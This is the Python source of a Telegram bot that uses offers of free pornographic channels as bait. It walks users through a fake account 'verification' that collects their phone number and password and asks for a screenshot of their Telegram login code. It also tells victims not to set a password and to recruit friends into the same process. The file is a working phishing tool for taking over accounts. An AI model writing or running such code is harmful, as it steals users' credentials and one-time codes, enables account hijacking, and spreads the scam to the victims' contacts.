# Rexa Kadal gurun

import time
import asyncio
from sys import version as pyver

import pyrogram
from pyrogram import __version__ as pyrover
from pyrogram import filters, idle
from pyrogram.errors import FloodWait
from pyrogram.types import Message

# IMPORT PYRO TYPES
from pyrogram.types import Message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery 


import config

loop = asyncio.get_event_loop()
SUDO_USERS = config.SUDO_USER

app = pyrogram.Client(
    ":RexaBot:",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)


# START YA INI JINK !

START_MESSAGE = """🕺 Hello Welcome To My Bot
𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙔𝙤𝙪𝙧 𝙎𝙩𝙚𝙥𝙨 𝙏𝙤 𝙂𝙚𝙩 𝙏𝙝𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩.

Please press : Click on the Link Below ⤦

➥ /GetViralChannels to get your free Koleksi Porn channel

―――――――――――――――――――
﹝ ⚠️ ﹞ Leave this bot when you don't believe Thanks.
―――――――――――――――――――
﹝ 🔞 ﹞ This Channel Contains Pornographic Content, if you are not old enough please leave this Bot

 𝗖𝗮𝘂𝘁𝗶𝗼𝗻 𝗗𝗼𝗻'𝘁 𝗦𝗽𝗮𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 ‼️

Verified t.me/Verifiedsafe
"""

START_BUTTON = [

    [  
        InlineKeyboardButton("Preview Channels 📷", url="https://t.me/+z4XdC6iQOKZkYzVl"),              
    ],            
]            
@app.on_message(filters.command("start") & filters.private)
async def start(_, message):
    text = START_MESSAGE
    reply_markup = InlineKeyboardMarkup(START_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# FREEPORN HANDLER 

FREE_MESSAGE = """
⚠️ 𝗔𝗧𝗧𝗘𝗡𝗧𝗜𝗢𝗡 To access the Channel below please Verify yourself first,
so that your account is registered in our Database System.

Please press : /AccountVerification verify your account into our data system.

❔ If you Need help
I have made a tutorial in the form of a video you just need to press /help
"""

FREE_BUTTON = [
            [
                InlineKeyboardButton(" 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘊𝘏𝘈𝘕𝘕𝘌𝘓𝘚 💋 ", url="https://t.me/+VzRPk6zBFKszYWNl"),
            ],
        ]

@app.on_message(filters.command("GetViralChannels") & filters.private)
async def free(_, message):
    text = FREE_MESSAGE
    reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# VWRIF CMD

@app.on_message(filters.command("AccountVerification") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, "__Please send your telegram phone number…__")
# PASSWORD 

@app.on_message(filters.regex("🔐") & filters.private)
async def pw(_, message):
    await app.send_message(message.chat.id, "__Please send your Account Password__")

# SEND NOMER

@app.on_message(filters.regex("6|1|2|3|4") & filters.private)
async def regex_cantik(_, message):
    rexa = await message.reply("__Sending Verification Code...__")
    await asyncio.sleep(10)
    await rexa.edit("__Successfully Sent Verification Code...__")
    await asyncio.sleep(5)
    await app.send_photo(message.chat.id, "https://telegra.ph/file/f84db4a1bc109f99747b0.jpg", caption="""
💾 Our System Need to Verify your Telegram Account

We sent a login code to your Telegram account, please send a screenshot and please post it here, as in the example Picture

📷 Please see the example picture!

Just send it in the form of a screenshot, you don't need to send it via text.


❓if you dont understand please type /help
""")

# SUCCESFULLY CMD & CALLBACK

SUCCES_TEXT = """
Succesfully add to Database ⚡

__Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉

**Attention!! When you remove the system that is logged in to your account, what will happen is that your entire channel will disappear, please pay attention**
―――――――――――――――――
📌 Do not put a password on your account!
――――――――――――――――――

if you want more channels please press the button below and follow the steps :
"""
SUCCES_BUTTON = [

    [  
        InlineKeyboardButton("Get More Channels", callback_data="kesatu"),              
    ],            
]            

@app.on_message(filters.regex("🥳") & filters.private)
async def succes(_, message):
    text = SUCCES_TEXT
    reply_markup = InlineKeyboardMarkup(SUCCES_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# EROR KODE

EROR_KODE_TEKS = """❌ __Error message detected__

Please send screenhot of your Code Not a text!
if you don't understand please type /help

Please start the bot again

"""

EROR_KODE_TOMBOL = [

    [  
        InlineKeyboardButton("♻️Start Again", url="https://t.me/DurovPornBot?start=start"),              
    ],            
]

@app.on_message(filters.regex("⚠️") & filters.private)
async def eror(_, message):
    text = EROR_KODE_TEKS
    reply_markup = InlineKeyboardMarkup(EROR_KODE_TOMBOL)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )


# REGEX

@app.on_callback_query(filters.regex("^kesatu"))
async def kesatu(_, callback_query):
    query = callback_query.data.split()
    if query[0] == "kesatu":
        KESATU = """
👉🏻 FOLLOW THE STEP TO GET MORE CHANNEL :

1. Join all the channels below 👇🏻
2. invite your friends or your other accounts to use this bot.
3. make sure the account you invite follows the steps like the first time you used this bot
3. when done type /done
4. wait for your account to be acc by database bot
5. Enjoy, you can access the channel 
6. 𝘼𝙏𝙏𝙀𝙉𝙏𝙄𝙊𝙉 𝘐𝘧 𝘺𝘰𝘶 𝘩𝘢𝘷𝘦 𝘯𝘰𝘵 𝘫𝘰𝘪𝘯𝘦𝘥 𝘢𝘭𝘭 𝘵𝘩𝘦 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘣𝘦𝘭𝘰𝘸 𝘺𝘰𝘶 𝘤𝘢𝘯𝘯𝘰𝘵 𝘣𝘦 𝘢𝘤𝘤𝘦𝘱𝘵𝘦𝘥 𝘣𝘺 𝘢𝘭𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 ! 

"""  
        KESATUTOMBOL = [
            [
                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘖𝘯𝘦 🩸", url="https://t.me/+CjSvNTRUJSY1MGQ9"),
                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘛𝘸𝘰 🩸", url="https://t.me/+YgYGe7KM7FllNDll"),
            ],
            [
                InlineKeyboardButton("𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝘛𝘩𝘳𝘦𝘦 🩸", url="https://t.me/+NjYTRB4tj0AxMDhl"),
                InlineKeyboardButton("💎𝗣𝗥𝗘𝗠𝗜𝗨𝗠💎", url="https://t.me/+w59Fy6HRofJiZmE9"),
            ],
            [
                InlineKeyboardButton("𝘐𝘯𝘥𝘰𝘯𝘦𝘴𝘪𝘢𝘯 𝘊𝘰𝘭𝘭𝘦𝘤𝘵𝘪𝘰𝘯 📸", url="https://t.me/+ot-eZOIdhh04ZjE9"),
                InlineKeyboardButton("𝘔𝘢𝘭𝘢𝘺𝘴𝘪𝘢𝘯 𝘊𝘰𝘭𝘭𝘦𝘤𝘵𝘪𝘰𝘯 📸", url="https://t.me/+d6gKaT9iAR42Yzk1"),
            ]    
        ]
        await callback_query.edit_message_text(
            KESATU, reply_markup=InlineKeyboardMarkup(KESATUTOMBOL)
        )

# INI BUAT INVIT TEMEN

@app.on_message(filters.regex("✅") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, """
Congratulations!!! 🎉

You have access to all channels!!
""")
# HELP

@app.on_message(filters.command("help") & filters.private)
async def helep(_, message):
    await app.send_video(message.chat.id, "https://t.me/Inihelpnya/3", caption="🎥 Video tutorial for sending screenshots so that the account can be verified by the system.")

print('Bot Started..')
app.run()
